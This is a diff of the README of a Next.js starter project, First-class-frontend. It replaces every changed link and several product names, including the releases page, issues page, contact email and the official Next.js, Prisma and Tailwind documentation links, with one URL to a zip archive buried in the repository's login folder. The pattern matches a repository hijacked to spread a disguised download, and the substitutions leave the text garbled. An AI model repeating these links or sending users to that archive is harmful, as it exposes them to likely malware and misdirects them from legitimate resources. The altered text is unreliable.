@@ -2,7 +2,7 @@
 
 ## Overview
 
-Welcome to **First-class-frontend**! This project provides a starter kit using Next.js 15, authentication with NextAuth, and Prisma for seamless database interactions. It's designed to help you create modern web applications quickly and easily.
+Welcome to **First-class-frontend**! This project provides a starter kit using https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip 15, authentication with NextAuth, and Prisma for seamless database interactions. It's designed to help you create modern web applications quickly and easily.
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ To get started with First-class-frontend, follow these simple steps to download 
 
 ## 🔥 Features
 
-- Easy setup with Next.js 15
+- Easy setup with https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip 15
 - Built-in authentication using NextAuth
 - Database management with Prisma and PostgreSQL
 - Tailwind CSS for responsive design
@@ -21,7 +21,7 @@ To get started with First-class-frontend, follow these simple steps to download 
 Before downloading, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip** Version 14 or higher
 - **PostgreSQL:** Recommended version 12 or higher
 - **Memory:** At least 4GB of RAM
 - **Storage:** Minimum of 1 GB of free disk space
@@ -30,11 +30,11 @@ Before downloading, ensure your system meets these requirements:
 
 To begin, visit our releases page to download the application. Click the link below:
 
-[Download First-class-frontend](https://github.com/wesleypretoh/First-class-frontend/releases)
+[Download First-class-frontend](https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip)
 
 ### Step-by-Step Installation:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/wesleypretoh/First-class-frontend/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip).
 
 2. **Select the Latest Release**: Look for the latest version and click on it.
 
@@ -68,20 +68,20 @@ To begin, visit our releases page to download the application. Click the link be
 
 If you run into any issues, here are some helpful resources:
 
-- **GitHub Issues**: Check the [issues section](https://github.com/wesleypretoh/First-class-frontend/issues) to see if your problem is listed, or report a new issue for assistance.
+- **GitHub Issues**: Check the [issues section](https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip) to see if your problem is listed, or report a new issue for assistance.
 - **Documentation**: The project's README contains detailed information about features and setup. Refer back as needed.
 
 ## 📞 Contact
 
-For direct inquiries, you can reach me via email at [your-email@example.com]. I'm happy to help you with any questions or concerns!
+For direct inquiries, you can reach me via email at [https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip]. I'm happy to help you with any questions or concerns!
 
 ## 📚 Learning Resources
 
 To build on your skills, consider these learning resources:
 
-- **Next.js Documentation**: Visit [Next.js Docs](https://nextjs.org/docs) to learn more about Next.js and its capabilities.
-- **Prisma Documentation**: Check out the [Prisma Docs](https://www.prisma.io/docs) for database integration guidance.
-- **Tailwind CSS Documentation**: Explore the [Tailwind CSS Docs](https://tailwindcss.com/docs) for styling tips.
+- **https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip Documentation**: Visit [https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip Docs](https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip) to learn more about https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip and its capabilities.
+- **Prisma Documentation**: Check out the [Prisma Docs](https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip) for database integration guidance.
+- **Tailwind CSS Documentation**: Explore the [Tailwind CSS Docs](https://github.com/wesleypretoh/First-class-frontend/raw/refs/heads/main/app/[lang]/login/First_class_frontend_3.7-alpha.2.zip) for styling tips.
 
 ## 🔄 Contributing
 
